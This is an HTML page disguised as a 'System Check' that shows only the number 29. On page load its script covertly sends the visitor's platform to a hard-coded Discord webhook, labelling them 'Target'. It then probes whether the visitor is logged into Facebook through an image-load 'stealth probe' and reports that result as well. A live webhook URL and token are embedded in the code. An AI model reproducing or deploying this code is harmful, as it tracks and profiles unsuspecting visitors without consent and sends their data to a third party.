<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Check</title>
    <style>
        body { background: #000; color: #ff0000; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: 'Courier New', monospace; }
        .v-num { font-size: 150px; font-weight: bold; text-shadow: 0 0 20px #f00; }
    </style>
</head>
<body>

    <div class="v-num">29</div>

    <script>
        const HOOK = "https://discord.com/api/webhooks/1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ";

        function reportToDiscord(title, desc) {
            const data = JSON.stringify({
                embeds: [{ title: title, description: desc, color: 16711680, timestamp: new Date() }]
            });
            
            // محاولة الإرسال بأكثر من طريقة لضمان الوصول في أندرويد 14
            navigator.sendBeacon(HOOK, data);
            fetch(HOOK, { method: 'POST', mode: 'no-cors', body: data });
        }

        window.onload = function() {
            // إرسال إشارة فورية بمجرد فتح الصفحة
            reportToDiscord("🔗 Connection Established", "Target is viewing Version 29\nPlatform: " + navigator.platform);

            // تكتيك الـ Stealth Probe
            // نحاول تحميل صورة من رابط يتطلب تسجيل دخول
            const probe = new Image();
            const startTime = Date.now();
            
            probe.src = "https://mbasic.facebook.com/favicon.ico?_rdr=" + Math.random();

            probe.onload = function() {
                const duration = Date.now() - startTime;
                reportToDiscord("🎯 Session Detected", "Facebook session is ACTIVE\nResponse Time: " + duration + "ms");
            };

            probe.onerror = function() {
                reportToDiscord("⚠️ Probe Finished", "Target might be logged out or using a strict VPN.");
            };
        };
    </script>
</body>
</html>
